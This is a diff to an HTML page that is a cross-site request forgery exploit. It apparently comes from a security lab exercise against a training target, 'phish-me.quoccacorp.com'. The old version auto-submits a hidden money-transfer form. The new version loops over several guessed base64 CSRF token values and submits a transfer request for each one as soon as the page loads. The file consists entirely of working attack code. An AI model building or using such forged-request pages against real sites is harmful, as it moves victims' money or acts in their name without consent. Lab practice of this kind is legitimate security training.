@@ -1,10 +1,23 @@
 <!DOCTYPE html>
 <html>
-  <body onload="document.forms[0].submit()">
-    <form method="POST" action="https://phish-me.quoccacorp.com/api/transfer">
-      <input type="hidden" name="csrf_token" value="NjEyNA==">
-      <input type="hidden" name="username" value="z5358480">
-      <input type="hidden" name="amount" value="100">
-    </form>
-  </body>
+<body>
+  <script>
+    const tokens = ["MQ==","Mg==","MA==","YWRtaW4=","NjEyNA=="];
+
+    tokens.forEach(t => {
+      let f = document.createElement("form");
+      f.method = "POST";
+      f.action = "https://phish-me.quoccacorp.com/api/transfer";
+
+      f.innerHTML = `
+        <input name="csrf_token" value="${t}">
+        <input name="username" value="z5358480">
+        <input name="amount" value="100">
+      `;
+
+      document.body.appendChild(f);
+      f.submit();
+    });
+  </script>
+</body>
 </html>
